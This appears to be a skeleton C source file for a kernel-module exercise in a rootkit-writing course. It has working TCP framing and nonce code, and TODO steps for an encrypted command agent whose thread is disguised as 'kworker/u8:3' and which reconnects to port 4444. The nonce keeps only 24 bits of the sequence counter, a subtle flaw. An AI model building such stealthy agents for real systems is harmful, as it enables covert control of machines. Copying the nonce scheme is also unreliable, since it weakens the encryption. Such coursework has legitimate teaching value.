// SPDX-License-Identifier: GPL-2.0
#include <crypto/aead.h>
#include <crypto/gcm.h>
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kthread.h>
#include <linux/module.h>
#include <linux/net.h>
#include <linux/random.h>
#include <linux/scatterlist.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <net/net_namespace.h>

#define RK_KEY_LEN	32
#define RK_KEY_HEX_LEN	64
#define RK_NONCE_LEN	12
#define RK_TAG_LEN	16
#define RK_HDR_LEN	18
#define RK_FRAME_MAX	4096
#define RK_PORT		4444
#define RK_RECONNECT_MS	5000

#define RK_DIR_CLIENT	0
#define RK_DIR_SERVER	1

static char rk_key_hex[RK_KEY_HEX_LEN + 1];
module_param_string(control_key, rk_key_hex, sizeof(rk_key_hex), 0);

static u8 rk_key[RK_KEY_LEN];
static struct task_struct *rk_thread;

struct rk_envelope_hdr {
	u8 version;
	u8 direction;
	__be64 session_id;
	__be64 sequence;
} __packed;

struct rk_session {
	struct crypto_aead *tfm;
	struct socket *sock;
	u64 session_id;
	u64 tx_seq;
	u64 rx_seq_expected;
};

/* ---- Framing (from L18) ---- */

static int send_exact(struct socket *sock, const void *buf, size_t len)
{
	size_t sent = 0;

	while (sent < len) {
		struct msghdr msg = { 0 };
		struct kvec vec = {
			.iov_base = (void *)((u8 *)buf + sent),
			.iov_len = len - sent,
		};
		int n;

		n = kernel_sendmsg(sock, &msg, &vec, 1, len - sent);
		if (n < 0)
			return n;
		if (n == 0)
			return -ECONNRESET;
		sent += n;
	}
	return sent;
}

static int recv_exact(struct socket *sock, void *buf, size_t len)
{
	size_t received = 0;

	while (received < len) {
		struct msghdr msg = { 0 };
		struct kvec vec = {
			.iov_base = (u8 *)buf + received,
			.iov_len = len - received,
		};
		int n;

		n = kernel_recvmsg(sock, &msg, &vec, 1, len - received, 0);
		if (n < 0)
			return n;
		if (n == 0)
			return -ECONNRESET;
		received += n;
	}
	return received;
}

static int send_frame(struct socket *sock, const void *buf, size_t len)
{
	__be16 hdr;
	int error;

	if (len > RK_FRAME_MAX)
		return -EMSGSIZE;

	hdr = htons((u16)len);
	error = send_exact(sock, &hdr, 2);
	if (error < 0)
		return error;

	if (len == 0)
		return 0;

	return send_exact(sock, buf, len);
}

static int recv_frame(struct socket *sock, void *buf, size_t max_len,
		      size_t *out_len)
{
	__be16 hdr;
	u16 payload_len;
	int error;

	error = recv_exact(sock, &hdr, 2);
	if (error < 0)
		return error;

	payload_len = ntohs(hdr);
	if (payload_len > max_len)
		return -EMSGSIZE;

	if (payload_len == 0) {
		*out_len = 0;
		return 0;
	}

	error = recv_exact(sock, buf, payload_len);
	if (error < 0)
		return error;

	*out_len = payload_len;
	return 0;
}

/* ---- Nonce construction (from L20) ---- */

static void rk_build_nonce(u8 *nonce, u64 session_id, u8 direction, u64 seq)
{
	__be64 sid = cpu_to_be64(session_id);

	memcpy(nonce, &sid, 8);
	nonce[8] = direction;
	nonce[9] = (seq >> 16) & 0xFF;
	nonce[10] = (seq >> 8) & 0xFF;
	nonce[11] = seq & 0xFF;
}

/*
 * TODO: Implement rk_aead_seal and rk_aead_open (from L19).
 *
 * These take a pre-built buffer with AAD + plaintext (or AAD + ciphertext),
 * use sg_init_one, aead_request_alloc, and crypto_aead_encrypt/decrypt.
 * See L19 for the detailed steps.
 */

/*
 * TODO: Implement rk_send_sealed.
 *
 * 1. Build the 18-byte envelope header (version=1, direction=RK_DIR_SERVER,
 *    session_id, sequence from s->tx_seq).
 * 2. Construct nonce with rk_build_nonce.
 * 3. Call rk_aead_seal with header as AAD and data as plaintext.
 * 4. Send the sealed envelope as a frame with send_frame.
 * 5. Increment s->tx_seq on success.
 */

/*
 * TODO: Implement rk_recv_sealed.
 *
 * 1. Receive a frame with recv_frame.
 * 2. Parse the 18-byte header from the frame.
 * 3. Check sequence >= s->rx_seq_expected (reject replay with -EPROTO).
 * 4. Reconstruct nonce from header fields.
 * 5. Call rk_aead_open to decrypt and verify.
 * 6. Update s->rx_seq_expected = seq + 1 on success.
 */

/*
 * TODO: Implement rk_handshake.
 *
 * 1. Send encrypted "HELLO" (5 bytes) with rk_send_sealed.
 * 2. Receive and decrypt response with rk_recv_sealed.
 * 3. Verify the response is exactly "HELLO" (5 bytes).
 * 4. Return -EPROTO if the response does not match.
 */

/*
 * TODO: Implement rk_handle_session.
 *
 * Loop while !kthread_should_stop():
 * 1. Receive a sealed command with rk_recv_sealed.
 * 2. Echo the decrypted command back with rk_send_sealed.
 * 3. Break on any error.
 */

/*
 * TODO: Implement rk_agent_thread.
 *
 * Loop while !kthread_should_stop():
 * 1. Create a TCP socket, connect to INADDR_LOOPBACK:RK_PORT.
 * 2. Allocate AEAD transform: crypto_alloc_aead("gcm(aes)", 0, 0).
 * 3. Set auth size (RK_TAG_LEN) and key (rk_key, RK_KEY_LEN).
 * 4. Generate random session_id, initialize session struct.
 * 5. Run rk_handshake. On failure, clean up and retry.
 * 6. Run rk_handle_session.
 * 7. On disconnect, clean up, sleep RK_RECONNECT_MS, retry.
 */

static int __init rk_init(void)
{
	/*
	 * TODO:
	 * 1. Validate and parse rk_key_hex into rk_key with hex2bin.
	 * 2. Zeroize rk_key_hex with memzero_explicit.
	 * 3. Start the agent kthread with kthread_run (name: "kworker/u8:3").
	 * 4. On kthread failure, zeroize rk_key and return the error.
	 */
	return -ENOSYS;
}

static void __exit rk_exit(void)
{
	/*
	 * TODO:
	 * 1. Stop the kthread if running.
	 * 2. Zeroize rk_key with memzero_explicit.
	 */
}

module_init(rk_init);
module_exit(rk_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rklings exercise module");
